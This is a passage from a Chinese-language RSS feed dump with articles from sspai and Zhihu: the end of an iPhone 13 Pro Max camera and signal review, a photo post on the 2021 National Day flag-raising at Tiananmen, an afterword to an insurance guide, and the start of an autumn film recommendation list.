class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/ee09454e2089f7417be361843bceea38.jpeg\"><figcaption>由 iPhone 13 Pro Max 长焦镜头拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/e84325c34581ef9fb918168fc5479986.jpeg\"><figcaption>由 iPhone 13 Pro Max 长焦镜头拍摄</figcaption></figure><p>当然，iPhone 拍照过度锐化的问题，也仍然存在。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/04/8f7076b13d4868e4dcf06295c50be2e0.jpeg\"><figcaption>由 iPhone 13 Pro Max 广角镜头拍摄</figcaption></figure><p>夜景方面，iPhone 13 Pro Max 的广角镜头和超广角镜头都加大了光圈，可用性变得更高。比如下面第一张由 iPhone 13 拍摄的夜景照片，左后方背景处的摩托车以及之后的草丛已经几乎看不清了；而下面第二张由 iPhone 13 Pro Max 拍摄的照片，右后方完全没有光源的自行车停放区域，放大照片之后也能清晰可辨。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/04/336f2b46f789f80c7427abca86ac4f3b.jpeg\"><figcaption>由 iPhone 13 广角镜头拍摄</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/04/31c9633d174ceb38417b47e71e302b36.jpeg\"><figcaption>由 iPhone 13 Pro Max 广角镜头拍摄</figcaption></figure><p>超广角镜头在弱光环境下的成像还是不出意外地毫无「画质」可言，但「出片率」更高了。下面这张照片是在一条视野几乎全黑的路上拍的，远处的灯光实际上也相当微弱，iPhone 却把近处栏杆的倒影、水面这样的细节都呈现了出来。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/04/ac49286df5fcc53339ce97b1f988dd68.jpeg\"><figcaption>由 iPhone 13 Pro Max 超广角镜头拍摄</figcaption></figure><p>使用广角镜头拍摄的夜景照片，画面继续保持了比较干净和明亮的特点。不过不可不提的是，iPhone 拍夜景时会出现的「鬼影」，毫不意外地也在这一代机型上得到了「保留」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/04/1448cbe8068a3f86c30e552aa9e8620c.jpeg\"><figcaption>由 iPhone 13 Pro Max 广角镜头拍摄</figcaption></figure><p>「计算摄影」是手机影像系统发展的大势所驱，也是本次 iPhone 13 全系列影像系统的升级重点。综合来看，iPhone 13 全系列——尤其是 iPhone 13 Pro 系列——的影像升级更像是一次锦上添花，让 iPhone 相机原本就擅长的事做得更好了。还是那句老话，iPhone 的相机可能没有很高的像素，也可能没有其它手机那么好看的硬件参数，但是凭借强大的计算能力、完善的软件功能，它一定会是你口袋里最易用的那台相机。</p>\n<p>不过也很遗憾的是，iPhone 相机上那些不那么「致命」的缺点，新的 iPhone 并没有解决它们，比如成像「鬼影」、过度锐化等等，这些问题或多或少都已经存在了几年，对于 Apple 而言，确实有些不太应该。作为用户而言，除了自己想办法「解决」这些问题，也只能期待也许 iPhone 14 能够真正解决这些问题吧。</p>\n<h2>被诟病的信号，「肉眼可见」地变好了</h2>\n<p>如果你问今年 iPhone 的信号变好了吗？我的回答如题所述：「肉眼可见」地变好了。顾名思义，不管是在室内还是户外，iPhone 信号满格的情况变得更多了。此外，信号检索与恢复能力也变得更强，乘车出隧道时能明显发现 iPhone 找回信号的速度更快了，几乎在出隧道的瞬间 iPhone 就能由弱信号变成信号满格的状态。</p>\n<p>但也仅此而已。在过去使用 iPhone 的几年时间里，我并没有遇到信号差影响使用的情况，虽然信号经常不在满格状态，但不管是打电话还是使用网络，都没有遇到什么问题。所以，我也无法体会大家都在说的「iPhone 信号差」究竟有多差，对于信号到底变好了没有，无法给你准确的结论。</p>\n<p>不过，也有一个细节可以与你分享。在我所住的小区里，大部分情况下手机在电梯里是没有信号的，包括使用 Android 手机的快递员和外卖员打来的电话也是一样。前段时间下楼遛狗的时候，我意外地发现在电梯里用 iPhone 13 Pro Max 也可以刷微博了，虽然网速还是不快，但也应该能够说明这台手机的信号真的有变好吧。</p>\n<h2>「平衡」与「极致」，该怎么选</h2>\n<p>我虽然一直认为非 Pro 系列的 iPhone 才是真正适合大多数人的 iPhone，其中，iPhone 13 不论是在屏幕尺寸、重量、配置、续航等等方面都取得了不错的平衡，价格相对来说也较合理，能够兼顾握持手感与使用体验。如果你在 iPhone 13 和 iPhone 13 mini 之间犹豫，我会建议你选 iPhone 13，毕竟你自己都还没有对于极致握持体验与便携性需求的意识，不然直接选 iPhone 13 mini 就行了。</p>\n<p>但我自己还是会继续选择 Pro 系列的 iPhone，除了更加精致的外观、更强的硬件，长焦镜头对我来说也是不可或缺的配置。虽然 iPhone 13 Pro Max 的续航能力着实让我眼前一亮，但是第二次用上 Pro Max 机型，太大和太重的感觉依然让我无法完全习惯。</p>\n<p>好在，今年的 iPhone 13 Pro 与 iPhone 13 Pro Max 没有配置方面的差别，选择的时候反而不再那么困难。毫无疑问，iPhone 13 Pro 是我心中 Pro 系列 iPhone 更好的选择，但是 iPhone 13 Pro Max 的大屏体验与持久续航带来的提升也是显而易见，对于 Pro 系列 iPhone 而言，不论你选哪款，我认为都会是不出错的选择。</p>\n<p>&gt; 关于 iPhone 13 的一切，都在 <a href=\"https://sspai.com/topic/362\" target=\"_blank\">这里</a> 了 📱</p>\n<p>&gt; 这些升级之后不能错过的功能与技巧，让你 <a href=\"https://sspai.com/topic/363\" target=\"_blank\">玩转 iOS 15</a> 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69097"},{"title":"国庆节去天安门广场看升旗仪式是一种什么体验？","date":"2021-10-03 13:25:09","description":"\n<p><b>这是全国人民庆祝中国共产党成立100周年之际迎来的国庆节；这是我们站在“两个一百年”奋斗目标历史交汇点迎来的国庆节；这是全面建成小康社会后的“首个”国庆节；这是开启全面建设社会主义现代化国家新征程的“首个”国庆节！</b></p>\n<p><br></p>\n<p>10月1日清晨，庄严肃穆的天安门广场安静地等待着国庆升旗仪式。</p>\n<p>6时06分，城楼吹响升旗号角，</p>\n<p>升旗仪式护旗方队整齐、飒爽的脚步声扣人心弦！</p>\n<p>一声嘹亮的“向国旗敬礼！”之后，雄壮的国歌声响彻天安门广场，伴随着东方的一缕朝霞，鲜艳的五星红旗冉冉升起！</p>\n<p>中国文艺网记者也在天安门广场，与现场群众共同见证这一庄严时刻。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9cd892ee5e9d242fd7ac42acd77f6d0c_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"809\" data-watermark=\"original\" data-original-src=\"v2-9cd892ee5e9d242fd7ac42acd77f6d0c\" data-watermark-src=\"v2-e828a6b628065d0d4cfa718399aae0b2\" data-private-watermark-src=\"v2-392722edcf8af6b3587383e7b528115c\"></p>\n<p>天安门广场举行国庆升旗仪式。中国文艺网记者王解生、马征，2021年10月1日拍摄于北京天安门广场。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2be73324de2e68f941d5bc62ca75ac4a_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"809\" data-watermark=\"original\" data-original-src=\"v2-2be73324de2e68f941d5bc62ca75ac4a\" data-watermark-src=\"v2-743778de58edee7bc1468fe86fa480a0\" data-private-watermark-src=\"v2-7d045bac157971ef8689fc39518ac9b6\"></p>\n<p>数万名市民和游客齐聚天安门广场，见证五星红旗冉冉升起的庄严时刻。中国文艺网记者王解生、马征，2021年10月1日拍摄于北京天安门广场。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4953d98667733312adfbfd8797859d8f_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"original\" data-original-src=\"v2-4953d98667733312adfbfd8797859d8f\" data-watermark-src=\"v2-b1c0674a1a6ecd4f21dcbab6c7cb2b09\" data-private-watermark-src=\"v2-4d7aac2408bf4545630a53c3d1e8bc00\"></p>\n<p>国庆升旗仪式结束后，人们在天安门广场合影留念。中国文艺网记者王解生、马征，2021年10月1日拍摄于北京天安门广场。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-01b314b862c44b75fdd1b0cab42554c9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"original\" data-original-src=\"v2-01b314b862c44b75fdd1b0cab42554c9\" data-watermark-src=\"v2-d3a89a14f0dee7e9ca56d294a67f7ec1\" data-private-watermark-src=\"v2-39355a391a75041a0b5f870ed7bd5c95\"></p>\n<p>国庆升旗仪式结束后，人们在天安门广场合影留念。中国文艺网记者王解生、马征，2021年10月1日拍摄于北京天安门广场。</p>\n<p><b>升旗仪式结束后，现场群众通过中国文艺网的镜头表达了对祖国母亲的祝福。</b></p>\n<a href=\"https://www.zhihu.com/video/1428100623087075328\"></a><a href=\"https://www.zhihu.com/video/1428100657161564160\"></a><a href=\"https://www.zhihu.com/video/1428100691495288832\"></a><a href=\"https://www.zhihu.com/video/1428100735775502336\"></a><a href=\"https://www.zhihu.com/video/1428100763779919872\"></a><a href=\"https://www.zhihu.com/video/1428100794821971968\"></a><a href=\"https://www.zhihu.com/video/1428100827601240064\"></a><a href=\"https://www.zhihu.com/video/1428100868889956352\"></a><p><b>在这个举国同庆的日子里</b></p>\n<p><b>祝福您，伟大的祖国</b></p>\n<p><b>生日快乐！</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-wen-yi-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国文艺网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/485008530/answer/2152790197?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">880 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/59133643?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">打算国庆节去北京天安门看升旗仪式，有什么好的建议？</a><br><a href=\"http://www.zhihu.com/question/54147926?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">想元旦去天安门广场看升旗？</a><br>\n","link":"http://www.zhihu.com/question/485008530/answer/2152790197?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"与保险「共舞」多年悟出的 5 条心得，或许能让你少走弯路","date":"2021-10-03 07:36:50","description":"\n<p><strong>编注：</strong>本篇文章为「<a href=\"https://sspai.com/series/221\">年轻人的第一份保险指南</a>」的后记。「<strong>保险怎么买，才不花冤枉钱</strong>」是许多年轻人共有的困惑。希望用合理的资金投入，构建最佳的保险配置，是我们相同的诉求。通过这份「<a href=\"https://sspai.com/series/221\">年轻人的第一份保险指南</a>」，希望能为你解答这些问题。</p>\n<span class=\"ss-paidSection\" product-id=\"221\" type=\"paidSection\"> </span><hr>\n<p>大家好，我是关哥，感谢你和我一起走进了保险的世界。</p>\n<p>《<a href=\"https://sspai.com/series/221\">年轻人的第一份保险指南</a>》的正文已经全部更新完成了。课程里我们密集地介绍了很多知识点，暂时消化不了也很正常。我希望这套课程，先帮你接触到一个大致的体系，即使对它的概念是模糊的，也没有关系。有些细节，是在我们真正要做决策时，才能体会到的区别。</p>\n<p>不知道有多少人会跟随课程，一路走到这一章节。但如果你看到这里了，我想继续和你分享几条建议，这也是我在和保险多年的「共舞」中，感悟出的道理。</p>\n<h2>通过提问来学习</h2>\n<p>其实，我自己的保险入门和精进，本来就是在回答问题中完成的。</p>\n<p>我在少数派的播客中，和老麦聊到了我过去的经历。如果你听过这期节目就会知道，我既接触过大量的保险从业人员，也面对面接触了很多银行客户，同时，也一直在做培训。我每天的工作内容，就是解答各种各样的问题。包括写公众号、做保险科普的这些年，我也在线回答了有几万条留言。</p>\n<p>有人对保险的规则充满疑惑：「为什么医生说我没事，但保险却不保？」「为什么我父亲做了大手术，重疾险也不给赔？」</p>\n<p>有人寻求配置保险的具体建议：「我到底要不要选择身负责任？」「别人给我推荐了一个保险，说是收益不错，比存银行划算，是真的吗？」</p>\n<p>甚至还有人仍对保险充满负面的看法：「买的没有卖的精！」「我想买，可是觉得理赔太难了。」</p>\n<p>我对保险的理解，就是在替别人寻找这些答案的过程中，逐渐得到了丰富和完善。从一个一个独立的知识点，构建起了立体多元的知识体系。同时，也看到了人性和思维模式的多样性。</p>\n<p>从一个人的提问中，其实能看出很多东西。对保险的认知在什么程度？关心的问题是什么？思考问题的逻辑在哪里？</p>\n<p>从专业角度看，这些问题本身就存在很多问题。一方面，绝大多数问题都体现了大众对保险基础知识的匮乏，这也是保险科普任重而道远的原因。另一方面，一个人对财富的认知，对风险的认知，以及是否能真诚的面对自己的需求，甚至思路是否清晰，都会影响对保险的理解。</p>\n<p>所以，当我要理解这些问题时，不仅要立足于保险，更要去理解问题背后体现出来的人性。对于我们买保险、用保险的人来说，则是要在尽可能多了解保险知识的前提下，做出尽量理性、不情绪化、适合自己个性化需求的决策。</p>\n<p>曾经看到过一则新闻，是个非常悲伤的故事。63 岁的老母亲，为了给儿子筹医药费，给自己买了意外险之后跳楼自杀，希望用这种方式得到保险的赔偿款。但自杀并不是意外，不能获得意外险的赔付。如果这位妈妈稍微懂得一点这个简单的概念，可能就不会选择这样一个令人唏嘘的方式。</p>\n<p>同时，也要对抗自己的某些人性。</p>\n<p>比如，我们喜欢灵活性，但保险却不能随便动用；我们喜欢自己掌控资金，但保险却要束缚我们用钱，我们喜欢马上看到收益，但保险却可能在几十年后才开始体现作用。</p>\n<p>可是换一个角度，这不正是保险通过外在力量，从自律转为他律，帮助我们避开人生中一个接一个的风险，帮助我们实现长期的、靠自身能力难以承受的风险么？这是另一个层面的顺应人性。</p>\n<p>我希望大家在做关于保险的决策时，多思考一些。思考才会产生疑问，有了疑问，来课程当中寻找答案，就会更加有的放矢。如果课程中也没有答案，那就留言给我好了，我会守在这里，长期解答大家的疑问。</p>\n<h2>真实面对风险，面对自己的能力边界</h2>\n<p>有很多人把保险理解成和保险公司的对赌。但保险和赌博其实有根本性的区别。赌博不但凭空造出了新的风险，而且一定有人会输，这是典型的零和博弈；而保险，对抗的都是既有风险，并且可以通过运营机制，获得共赢的结果。</p>\n<p>也就是说，保险所保障的各类风险，都是原本就存在的。而从保险产品的多元性和复杂性，就能倒推出无数种风险。</p>\n<p>在《原则》这本书中，瑞•达利欧写道「没有任何东西是确定的：总是存在会给你造成重大损失的风险，即使在看起来最安全的押注中也是如此，所以，你最好总是假设自己没有看到全部。」</p>\n<p>没有人能够看到所有的风险，但看不到、没有体会过，不代表它不存在。高分韩剧《机智的医生生活》中，一名患者得知自己患有脑肿瘤后，不敢相信，喃喃自语：「我从没想过自己会得这个病。」</p>\n<h2>最好的选择是比其他选择都好的那个</h2>\n<p>一张保单往往会跟随我们一生，因此，希望它尽善尽美，是可以被理解的期待。</p>\n<p>但不知你是否发现，在每一种类型的讲解中，除了它的作用，我都会强调很多产品覆盖不到的地方。而且即便是我们配置了各种各样的产品，也会因为行业本身的一些原理，导致部分保障的缺失。</p>\n<p>以争议比较多的重疾险为例，有人会担心重疾险的的疾病种类不够多，自己可能会得某种重病，刚好不在保障范围里，故而迟迟不能下决心配置重疾险。</p>\n<p>这种可能性存在吗？当然。</p>\n<p>但是，此时的选择项并不是「理想的产品」和「现实的产品」，因为理想的产品并不存在，没有任何一款重疾险能生称包含了世界上所有的重疾。</p>\n<p>经过学习，我们就会知道，不同产品重大疾病种类范围的区别，非常有限。实际的选择项，是「有重疾险」和「没有重疾险」。如果永远在纠结理想和现实的距离，最后还是双手空空，连不完美的现实都没有。更何况，受限于个人的预算、健康状况、能接触到多少行业信息这些因素，我们能选择的范围更加有限。</p>\n<p>保险不是完美的方案，但它可能是效果最好的方案。</p>\n<h2><strong>我们只需要30%的信息就可以做决定</strong></h2>\n<p>保险产品有个特点，所有的条款、投保规则、费率都是公开透明的。按照监管的要求，都是会明确体现在合同或是介绍页面上。因此，保险产品的同质性非常严重。任何一款有创新、市场接受度高的产品面世，很快就会出现大量的同款产品。</p>\n<p>而保险的条款，也分共同条款和特殊条款。共同条款每个产品几乎一样，只有特殊条款才有所不同。因此，虽然产品千千万，但同类型产品的主体部分都是非常类似的，大部分的区别都体现在细节上。</p>\n<p>为了体现营销效果，很多细节被过度包装，并不是因为它多重要，而是更重要的部分，各个产品都一样，因此只能重点突出相对不那么重要的一些区别，以彰显特色。</p>\n<p>所以我们并不需要为了做出最好的选择，非要把市面上的产品全部过一遍（也不可能），或者把自己变成行业专家，把每个微小的细节都研究透。我们只要能<strong>明确 30% 的信息</strong>就足够做出决策了，了解那些最重要的，以及最明显的区别。</p>\n<p>剩下的 70%，对我们带来的影响，要远小于「不配置」或者「拖延」带来的影响。</p>\n<h2>如果有人给建议，听他的逻辑，而不是结论。</h2>\n<p>我曾经给出过这样的建议，做保险决策，要么自己好好做功课，要么交给专业的人。</p>\n<p>很多人受限于时间精力，都会选择第二种方式。但是这个人是否专业？是否客观？在缺乏专业认知的前提下，也无法判断。即便是想好好做功课，也会看到各种各样的观点，观点之间可能也会有区别。究竟哪种是对的？</p>\n<p>既然是观点，就一定是主观的，就没有绝对的对错。一个人的背景和偏好都会影响他的观点。怎么办？如果只是看结论，我们就会陷入「让别人的结论在自己的脑子里打架」的状态。</p>\n<p>要看逻辑，看得出结论的过程，看考虑的因素，是否跟你的背景相似、是否能说服你。一定要带着自己的思考，代入自己的个性化背景和需求。</p>\n<h2>欢迎与你再次相遇</h2>\n<p>在以上所有的过程中，只要我们参与了、思考了，就一定会产生各种各样的问题。爱因斯坦曾经说：「提出一个问题往往比解决一个问题更为重要。」</p>\n<p>因为我们要先具有发现问题的能力，并且是发现核心问题的能力，才能提出准确、清晰、更接近本质、更具有操作性的问题。</p>\n<p>愿我们永远保持提出问题的能力。</p>\n<p>感谢你的陪伴，希望能看到你的问题，更希望我们在新的课程里相见。</p>\n<span class=\"ss-paidSection\" product-id=\"221\" type=\"paidSection\"> </span><p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69091"},{"title":"看什么 · 特别篇丨秋天到了，我最想生活在这 10 部电影里","date":"2021-10-03 04:20:22","description":"\n<h2>导语</h2>\n<p>伴着淅淅沥沥秋雨而来的除了骤降的气温，还有秋日独特的浓郁色调，我们去公园散步，到山间露营，品尝时令美味，也许每年你都有一份长长的「秋日必做清单」，毕竟没人想错过秋天短暂的赏味期限。</p>\n<p>本片单共 10 部影视作品，大都是发生在秋天的故事，有人恋爱，有人离别，也有人过着平淡却美好的日常。你的秋天发生着怎样的故事，你最喜欢在秋天做些什么？欢迎在评论区分享和讨论 🙋，我们会选取一则优质评论，送上少数派周边一份 🎁！</p>\n<p>之后每个月「看什么」栏目都会推出不同主题的特辑，关注每周新片的同时，也和大家一起回顾过往经典。</p>\n<h2>TL;DR</h2>\n<ul>\n<li>[电影] 秋天的故事、[电影] 秋天的童话</li>\n<li>[电影] 蒂莫西的奇异生活、[动画] 狼与香辛料、[电影] 小森林 夏秋篇</li>\n<li>[电影] 转转、[电影] 去见瀑布、[电影] 晚秋</li>\n<li>[电影] 当哈利遇到莎莉、[电影] 秋天里的春光</li>\n</ul>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如果你喜欢我们的内容，希望它持续更新，或是有任何建议，就请留言和充电吧~ 你们的支持将是我们的重要动力！</p>\n<hr>\n<h2>[电影] 秋天的故事</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/21b2157c5cb7aa33afd62d501d0c3296.png\"></figure><p>关键词：剧情 / 爱情</p>\n<p>片长：112 分钟；<a href=\"https://movie.douban.com/subject/1294140/\">豆瓣链接</a></p>\n<p>观看渠道：<a href=\"https://www.bilibili.com/bangumi/play/ep385305\">哔哩哔哩</a></p>\n<blockquote><p>当生命这场旅行走到秋天，方能结出最香醇的葡萄果实。</p></blockquote>\n<p>@利兹与青鸟 ：《秋天的故事》是法国导演侯麦「四季故事系列」的最后一部，侯麦眼中的秋天，是丰收的、喜悦的、金色的季节，单身的马嘉利经营的葡萄园迎来了收成旺季，她的好友伊莎贝拉的女儿即将举行婚礼，人们在秋日午后洒满金色阳光的庭院树下，谈论着生活与爱情。</p>\n<p>侯麦热衷于展示人物在道德边缘的试探，但总能把看似狗血的情节处理得轻盈自然、不落俗套。《秋天的故事》聚焦于中年男女的情感生活，全片情节可以简单概括为「一厢情愿为好友介绍对象后，产生的种种误会」：马嘉利渴望爱情却不愿意主动；好友伊莎贝拉替马嘉利相亲，反而差点动心；少女罗欣幼稚地想撮合前男友和马嘉利，为这个似乎成熟的想法而沾沾自喜；而历经世事的马嘉利仍跟随自己的直觉，对待爱情不愿迁就，保留着最初的天真无邪。侯麦电影里的法国女人，无论处于四季里的秋天，还是人生的中年阶段，都因她们的豁达、真实与洒脱，散发着独具一格的魅力。</p>\n<p>影片中，马嘉利自述：「我想认识男人，但又不想主动」，伊莎贝拉直言：「我要所有男人都爱我，特别是我不爱的人」，让人不由佩服侯麦竟能如此敏锐地洞察男女相处过程中，那些细微又复杂的情绪。当片中口是心非、在理性和情感间摇摆不定的人物终于坦诚相对，我们也只能感慨：没有早一步，也没有晚一步，秋风终会带来最好的结果。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/7b121d65e5d13060191c3d22ce5df7d5.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/befa484b557a90a65afa619ca8fe1f76.jpg\" alt=\"\"></figure><h2>[电影] 秋天的童话</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/f95cdfbcfc68c059a98947f4e95e2c63.png\"></figure><p>关键词：剧情/ 爱情</p>\n<p>时长：98 分钟；<a href=\"https://movie.douban.com/subject/1301912/\">豆瓣链接</a></p>\n<p>观看渠道：<a href=\"https://www.ixigua.com/6578640921284313607?id=6578641111298867715&amp;logTag=f41f7c5f4303001e08d7\">西瓜视频</a></p>\n<blockquote><p>这个秋天，是因为有你才美丽。</p></blockquote>\n<p>@潘誉晗 ：那年的秋天真好，虽然到纽约来的李琪（钟楚红饰）发现了男友的背叛，可是前来接她照顾她的船头尺（周润发饰）却藏着最深的温柔。秋天也许真的很适合恋爱，整个电影暖融融的基调复古又温馨。最青春靓丽的红姑和最洒脱自在的发哥就在这样的季节相知、相恋。虽然船头尺看上去是一个放荡不羁的瘪三，可三十多岁的男人，也会因为心动而变得小心翼翼。陪着李琪做她喜欢的事，即使嘴上说她是「茶煲」（ trouble ），却依然想着要哄她开心。秋风吹起的时候带来了一树的落叶，即便是两个人就这样走在街上有一搭没一搭的聊天日常，就能让人回味无穷又感慨万千。</p>\n<p>最后两个人「麦琪的礼物」般的彼此挂念也很浪漫。原来两个不同世界的人心动之后的克制，是即使没有任何亲密举动也可以如此缱绻动人，不禁让人想起塞林格那句「爱是想触碰却又收回的手」。好在秋天的这个童话，终是会圆满的。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/0d82e6a1e02a997ca7f012d72c17b6a3.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/07cb4b952b55544a322cdd6a72d9e5e1.jpg\" alt=\"\"></figure><h2>[电影] 蒂莫西的奇异生活</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/8a061a393c72c916aa810e19fc427f45.png\"></figure><p>关键词：剧情 / 家庭 / 奇幻</p>\n<p>片长：105 分钟</p>\n<p>观看渠道：<a href=\"https://v.qq.com/x/cover/qdpfniivlriabgn.html?ptag=douban.movie\" target=\"_blank\">腾讯视频</a>；<a href=\"https://movie.douban.com/subject/3819871/\" target=\"_blank\">豆瓣链接</a></p>\n<p>@阿斯巴-甜：生活在斯坦里维尔（Stanleyville）小镇的格林（Green）夫妇结婚多年，夫妻恩爱，最大的愿望就是想有一个孩子。在多次尝试无果、打算放弃之时，一个双脚长着绿叶的男孩蒂莫西（Timothy）竟神奇地出现在家中。在与蒂莫西的相处过程中，他们渐渐学会了如何做父母。</p>\n<p>影片的主要情节发生在秋季，电影中也用了很多镜头来捕捉这份秋意。无论是在布满落叶的山坡上追逐，还是在飘落着红叶的大道上骑单车，这些场景透过胶片摄影所带来的独特饱和感，都让屏幕前的我直想冲进去，在落叶垛上狠狠踩上两脚，来体会这厚实的秋天。</p>\n<p>导演将场景设置在秋季，并不只是为了拍出好看的画面，更重要的是将情节的推进融入在季节的变化中。时间逐渐走进深秋，蒂莫西腿上的绿叶也在逐渐变黄、枯萎乃至凋谢。伴随树叶的凋零，格林夫妇与蒂莫西的故事也将告一段落。这不正像世间大多数家庭一样，父母在人生的夏季生养子女，并在秋季与子女分别。而父母就像影片最后所说：「世界上有两个人，除了你别无所求，他们会竭尽全力，偶尔也会犯错， 你跟他们只能短暂地相聚，但他们给你的爱却超乎想象」。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/521589b9ea9d63d8349563922f1c853f.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/43782677d8e218116ca9e13ac5622bfb.png\" alt=\"\"></figure><h2>[动画] 狼与香辛料</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/be2104ffed0571b21616d5f17bfe82a4.png\"></figure><p>关键词：小说改 / 剧情 / 奇幻 / 恋爱</p>\n<p>第一季：24 分钟（单集）× 13 集；<a href=\"https://www.netflix.com/title/70205026\" target=\"_blank\">Netflix</a> / <a href=\"https://www.acfun.cn/bangumi/aa6000817\" target=\"_blank\">AcFun</a>（有删改）；<a href=\"https://movie.douban.com/subject/2369599/\" target=\"_blank\">豆瓣链接</a></p>\n<p>第二季：24 分钟（单集）× 13 集；<a href=\"https://www.netflix.com/title/70205026\" target=\"_blank\">Netflix</a> / <a href=\"https://www.acfun.cn/bangumi/aa6000818\" target=\"_blank\">AcFun</a> / <a href=\"https://www.bilibili.com/bangumi/media/md27059477/\" target=\"_blank\">哔哩哔哩</a> / <a href=\"https://v.youku.com/v_show/id_XMTY5OTEwMTk2OA==.html\" target=\"_blank\">优酷</a>；<a href=\"https://movie.douban.com/subject/3865102/\" target=\"_blank\">豆瓣链接</a></p>\n<p>读原作：<a href=\"https://book.douban.com/series/8903\" target=\"_blank\">新经典文库</a>（终止发行） / <a href=\"https://book.douban.com/series/1875\" target=\"_blank\">台湾角川</a></p>\n<blockquote><p>咱如果喜欢上汝，汝可是会很麻烦的。</p></blockquote>\n<p>@SHY：澄澈的天空不见烈日，饱满的麦穗迎风摇曳，便迎来了丰收的时节。在这个村落，人们常说麦子里寄宿着名为赫萝的狼神，阵阵麦浪是狼在奔跑，倒伏垂地是遭狼践踏，在收割后举行盛大的祭典祈求来年收成。传承自数百年前的习俗早已失去原本的样貌，年轻人们更愿意相信肥料与耕种技术，防止神灵逃跑的仪式也成了无人在意的形式。秋收的最后一天，旅行商人罗伦斯途径此处，却在装满麦子的回程马车上发现了一位熟睡的少女。对方有着狼耳和美丽的尾巴，自称司掌丰收的贤狼赫萝，如今却只想回到遥远北方的故乡。</p>\n<p>或许是连绵不绝的麦田构成了对赫萝的第一印象，而皎洁月光下的初遇又过于惊艳，即使两人早已一同见证冬去春来，我还是会将《狼与香辛料》与金色的秋天联系起来。这是一部温馨治愈的公路喜剧，也是一段跌宕起伏的异界冒险，记载了狡黠的贤狼和精明的商人在北上行商途中所遭遇的事件，当中却不涉及剑与魔法，只有机遇与风险并存的商战。作者支仓冻砂结合中世纪欧洲历史背景，以经济学为写作重心，介绍了从货币到做空的种种商业知识，考据翔实，设定严谨，甚至可以当作经济学入门读物，总能让我闲暇时重温。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/52954f9bd798aacc6feed62e848c6268.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/03/e31a35630fa4ec17fcf29f30c9fb2383.jpg\" alt=\"\"></figure><h2>[电影] 小森林 夏秋篇</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/03/927d4e1068f3ac00f4bc1c3f0d6532de.png\"></figure><p>关键词：美食 / 生活 / 治愈</p>\n<p>片长：111 分钟；<a href=\"https://movie.douban.com/subject/25814705/\">豆瓣链接</a></p>\n<p>观看渠道：<a href=\"https://v.qq.com/x/cover/yz98ta4nfjtaa6q/h0017hm4g46.html\">腾讯视频</a></p>\n<blockquote><p>秋日里的悠长假期。</p></blockquote>\n<p>@利兹与青鸟 ：由于无法适应东京快节奏的都市生活，二十多岁的女孩市子回到故乡小森，开始了亲手农耕劳作、静看云卷云舒的生活。在市子平缓的旁白里，镜头跟随着脚踏单车的她，穿梭经过郁郁葱葱的林间小路，最终到达被群山包围的小森 —— 